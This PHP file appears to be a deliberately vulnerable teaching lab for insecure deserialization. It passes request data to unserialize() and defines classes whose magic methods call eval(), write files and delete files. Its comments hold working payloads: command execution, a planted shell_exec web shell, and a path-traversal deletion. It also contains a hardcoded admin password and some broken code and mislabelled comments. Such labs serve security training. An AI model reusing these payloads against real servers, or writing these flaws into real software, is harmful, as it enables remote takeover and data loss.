<?php 
    // Main Class 

class User {

    public $Username;
    public $Password;
    public $Status;

    function __construct($user , $pass, $stat) {
        $this->Username = $user;
        $this->Password = $pass;
        $this->Status = $stat;

    }

    function auth(){

        if ($Username == "admin" && $Password == "Admin") {
            $admin = true;

            echo "welcome admin";
        } 
        else {
            $admin = false;
            echo "Not Authorized";
        }
    }

}

    // Other Classes

class Example1 {
    public $inject;

    function __construct() {
        // php code
    }

    function __destruct(){           // test case 1 RCE
        if(isset($this->inject)){
            eval($this->inject);
        }
    }

    /* You can achieve RCE using this deserialization flaw because the class Example1 has a magic function that runs eval() and a user-provided object is passed into unserialize.    */

}

    /*  Payload 1:  exploiting eval() in __wakeup()  Magic Method 

        # Basic serialized data
        a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

        # Command execution   with eval()
        string(68) "O:8:"Example1":1:{s:6:"inject";s:17:"system('whoami');";}"

    */

class Example2 {
    

    function __construct($filename, $data) {
        $this->filename = $filename ;
        $this->data = $data;
    }

    function __wakeup(){            // test case 2 RCE
        //file_put_contents($this->filename, $this->data);
        $fd=fopen($this->filename,"a+");
        fwrite($fd,$this->data);
        fclose($fd);


    }

}


/* 

  exploiting file_put_contents() in __destruct()  Magic Method

    payload 1: Do it manually 

        O:8:"Example2":2:{s:8:"filename";s:9:"shell.php";s:4:"data";s:19:"<?php phpinfo(); ?>";}

    payload 2: make a php file to serialize our object and send it 

        <?php

         class Example2{
            public $filename;
            public $data;

        }

        $obj = new Example2();
        $obj->filename = '/var/www/html/shell.php';
        $obj->data =  "<?php echo shell_exec(\$_GET['e'].' 2>&1'); ?>";
         
        echo serialize($obj);
         
        ?>

        Serialized Payload:

        O:8:"Example2":2:{s:8:"filename";s:23:"/var/www/html/shell.php";s:4:"data";s:45:"<?php echo shell_exec($_GET['e'].' 2>&1'); ?>";}


*/


class Example3 {

   public $cache_file;

   function __construct()
   {
      // some PHP code...
   }

   function __destruct()
   {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);

      /* Payload:
            data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";} 
        */
   }

}

?>
<?php 
    
    // Main App 

    $user = new User("vickie","test","not admin");
    //$user->Username = 'vickie';
    //$user->Password = "test";
    //$user->Status = 'not admin';

    //echo serialize($user);

    if(isset($_REQUEST['data'])){  

        $data = base64_decode($_REQUEST['data']);
        echo $data;

        $var1=unserialize($data);
        //print_r( $var1);

       /* if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }*/
    }
    else{
        echo ""; # nothing happens here
    }


?>
